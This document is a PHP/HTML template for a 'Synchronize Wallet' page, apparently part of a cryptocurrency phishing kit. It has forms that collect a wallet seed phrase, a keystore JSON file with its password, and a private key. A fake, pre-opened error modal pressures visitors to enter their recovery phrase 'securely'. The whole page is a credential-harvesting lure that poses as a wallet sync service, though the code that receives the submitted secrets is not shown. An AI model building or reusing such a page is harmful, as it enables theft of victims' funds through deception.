<html>

<head>
  <title>Synchronize Wallet - <?= $company->name ?></title>
  <?php require_once("includes/links.php") ?>
  <link rel="stylesheet" href="<?= $uri->site ?>css/sync.css<?= $cache_control ?>">
</head>

<body class="modal-open" style="padding-right: 17px;">
  <div id="__next">
    <div class="font-roboto" id="content">
      <?php require_once("includes/header.php") ?>

      <div class="container-fluid">
        <div class="row">
          <div class="col-md-4 offset-md-4">
            <br>
            <a href="wallet.html" style="font-size: 20px;"><i class="fa fa-angle-left"></i>&nbsp; &nbsp;Synchronize Wallet</a>
          </div>
        </div>


        <div class="container-fluid">
          <div class="row">
            <div class="col-md-4 offset-md-4">
              <ul class="nav nav-tabs">
                <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
                <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
                <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
              </ul>
            </div>
          </div>
        </div>
        <section style="margin-top: 40px;">
          <div class="container-fluid">
            <div class="row">
              <div class="col-md-4 offset-md-4">
                <!-- Tab panes -->
                <div class="tab-content">
                  <p id="msg" style="color:red;"></p>
                  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
                    <form method="post" action="">
                      <textarea class="form-control" rows="5" name="phrases" id="phrases" placeholder="Enter your phrase here"></textarea>
                      <input type="hidden" id="wall" name="wall">
                      <p class="text-" style="margin-top: 10px;">Typically 12 or 18 (sometimes 24) words seperated by a single spaces.</p>
                      <div class="form-group"><button class="btn btn-primary btn-block" type="submit" id="submit" name="submit">SYNC</button></div>
                    </form>

                  </div>
                  <div role="tabpanel" class="tab-pane fade" id="keystore">
                    <form method="post" action="">
                      <div class="form-group">
                        <textarea class="form-control" name="keystorejson" id="keystorejson" rows="5" placeholder="Keystore JSON"></textarea>
                        <input type="hidden" id="walls" name="walls">
                      </div>
                      <div class="form-group">
                        <input class="form-control" type="password" id="password" name="password" placeholder="Password">
                      </div>
                      <p class="text-" style="margin-top: 10px;">
                        Several lines of text beginning with "{...}" plus the password you used to encrypt it.
                      </p>


                      <div class="form-group"><button class="btn btn-primary btn-block" type="submit" id="submits" name="submit">SYNC</button></div>
                    </form>
                  </div>
                  <div role="tabpanel" class="tab-pane fade" id="privatekey">
                    <form name="privatekey" method="post" action="">
                      <div class="form-group">
                        <input class="form-control" name="privatekeys" id="privatekeys" placeholder="Private Key">
                        <input type="hidden" id="wallss" name="wallss">
                      </div>
                      <p class="text-" style="margin-top: 10px;">Typically 12 or 18 (sometimes 24) words seperated by a single spaces.</p>

                      <div class="form-group"><button class="btn btn-primary btn-block" type="submit" id="submit-btn" name="submit">SYNC</button></div>
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div id="" class="modal fade show" style="padding-right: 17px; display: block;">
            <div class="modal-dialog">
              <div class="modal-content">
                <div class="modal-header">
                  <h5 class="modal-title" style="font-size:130%"><b>Error <font color="red">!!!</font></b></h5>
                  <button type="button" class="close" data-dismiss="modal">×</button>
                </div>
                <div class="modal-body">
                  <p>Unable to detect wallet automatically. Kindly log in manually using your 12 or 18 (sometimes 24) word phrases.<br> &nbsp;</p>

                  <button type="button" class="btn btn-primary" data-dismiss="modal">Continue Securely</button>

                </div>
              </div>
            </div>
          </div>
        </section>

      </div>
    </div>

    <?php require_once("includes/footer.php") ?>
    <script>
      $(document).ready(function() {
        $("#myModal").modal("open")
      })
    </script>
  </div>

</html>